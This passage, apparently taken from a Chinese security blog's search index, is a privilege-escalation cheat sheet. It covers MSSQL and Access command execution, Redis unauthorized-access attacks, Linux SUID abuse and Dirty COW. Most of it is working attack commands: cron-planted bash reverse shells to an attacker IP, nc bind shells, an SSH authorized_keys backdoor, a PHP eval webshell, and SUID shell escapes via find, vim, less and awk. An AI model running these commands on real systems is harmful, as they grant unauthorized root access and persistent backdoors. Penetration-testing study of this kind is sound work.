/add&quot;&#x27; 删除用户 1declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c &quot;net user test /delete&quot;&#x27; 沙盒提权什么是沙盒模式? 沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的. 利用条件： 1，Access可以调用VBS的函数，以System权限执行任意命令2，Access执行这个命令是有条件的，需要一个开关被打开3，这个开关在注册表里4，SA是有权限写注册表的5，用SA写注册表的权限打开那个开关6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令 开启默认关闭的xp_regwrite存储过程： exec sp_configure &#39;show advanced options&#39;,1;reconfigure; exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;reconfigure; 利用jet.oledb执行系统命令添加系统账号： openrowset(&#39;microsoft.jet.oledb.4.0’,’;database=c:/windows/system32/ias/ias.mdb’,‘select shell(&quot;whoami&quot;)&#39;) openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。 Redis提权基于Redis未授权或者已经获得Redis密码 连接数据库 1redis -cli -h ip -p port pass(未授权未设置密码，pass字段为空) 利用计划任务执行命令反弹 shell在服务器上开启监听7777端口 12345执行命令set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.189.130/7777 0&gt;&amp;1\\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 过一分钟左右就可以收到shell 写 ssh-keygen 公钥然后使用私钥登陆在攻击机中生成ssh公钥和私钥，密码设置为空: 1ssh-keygen -t rsa 进入.ssh目录：cd &#x2F;root&#x2F;.ssh ，将生成的公钥保存到1.txt： 12cd /root/.ssh(echo -e &quot;\\n\\n&quot;;cat id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; 1.txt 连接靶机上的redis服务，将保存的ssh公钥1.txt写入redis: 1cat 1.txt | redis-cli -h 192.168.189.136 -p 6379 -x set hack 连接redis 1redis-cli -h 192.168.189.136 更改redis备份路径为ssh公钥存放目录 1config set dir /root/.ssh 设置上传公钥的备份文件名字为authorized_keys 1config set dbfilename authorized_keys save命令保存 ssh登录 1ssh -i /root/.ssh/id_rsa root@192.168.189.136 写webshell前提：知道网站根目录 12345redis-cli -h 192.168.189.136 -p 6379config set dir /var/www/htmlconfig set dbfilename shell.php set x &quot;&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;&quot; save Linux提权信息收集手动信息收集： cat /etc/issue&#x2F;&#x2F;版本号 cat /proc/version&#x2F;&#x2F;内核版本 cat /etc/profile&#x2F;&#x2F;环境变量密码和api密钥 ps -aux&#x2F;&#x2F;运行服务 ls -alh /usr/bin&#x2F;&#x2F;安装应用程序 ls -alh /var/spool/cron&#x2F;&#x2F;计划任务 自动信息收集工具 LinEnum（Linux枚举及权限提升检查工具），用于linux本地信息收集 SUID文件： linux-exploit-suggester2漏洞探测工具： SUID提权 SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么该程序运行时，使用的权限为SUID设置的权限，而不是当前用户权限。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义. 在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效 设置SUID权限 12chmod u+s filename 设置SUID位chmod u-s filename 去掉SUID设置 ls -al查看文件权限 寻找正在运行的suid程序 123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; ; 常用的SUID提权程序及其用法 nmap 适用版本:nmap2.02至5.21 在早期nmap版本中,带有交互模式,因而允许用户执行shell命令 使用如下命令进入nmap交互模式: 1nmap --interactive 在nmap交互模式中 通过如下命令提权 123nmap&gt; !shsh-3.2# whoamiroot msf当中也有利用nmap进行提权的模块 1exploit/unix/local/setuid_nmap find find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。 提权如下: 12touch anyfile #必须要有这个文件find anyfile -exec whoami \\; 1234#进入shellfind anyfile -exec &#x27;/bin/sh&#x27; \\;sh-5.0# whoamiroot linux一般都安装了nc 我们也可以利用nc 广播或反弹shell 广播shell: 1find user -exec nc -lvp 4444 -e &#x27;/bin/sh&#x27; \\; 在攻击机上: 1nc 靶机ip 4444 反弹shell 1find anyfile -exec bash -c &#x27;bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1&#x27; \\; 在攻击机上: 1nc -lvvp 4444 Vim vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。 1vim.tiny /etc/passwd 通过vim进入shell 1234vim.tiny#vim命令:set shell = &#x27;/bin/sh&#x27;:shell Bash 以下命令将以root身份打开一个bash shell。 123bash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) less less命令也可以进入shell 123less /etc/passwd#在less中输入:!/bin/sh more more命令进入shell和less相同 123more /etc/passwd#在more中输入:!/bin/sh 要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell cp 使用cp 命令覆盖原来的/etc/passwd文件，添加一个管理员账户 awk awk命令进入shell: 1awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; nano 1234nano #进入nano编辑器Ctrl + RCtrl + X #即可输入命令 内核溢出漏洞提权和Windows内核溢出漏洞提权方式类似类似 上传漏洞探针，根据漏洞使用对应漏洞exp进行提权 脏牛提权 将40847.cpp复制到桌面 1cp /usr/share/exploitdb/exploits/linux/local/40847.cpp . 上传至靶机并编译执行 123upload 40847.cpp /tmp/40847.cppg++ -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil./40847 su密码被更改为dirtyCowFun 执行su命令报错 需要利用python生成一个伪终端，否则不能执行su命令 1python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 成功提权","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"}]}],"categories":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/categories/%E9%9D%B6%E5%9C%BAwp/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"靶场wp","slug":"靶场wp","permalink":"http://example.com/tags/%E9%9D%B6%E5%9C%BAwp/"},{"name":"python开发","slug":"python开发","permalink":"http://example.com/tags/python%E5%BC%80%E5%8F%91/"},{"name":"权限提升","slug":"权限提升","permalink":"http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"域渗透","slug":"域渗透","permalink":"http://example.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"log4j2","slug":"log4j2","permalink":"http://example.com/tags/log4j2/"}]}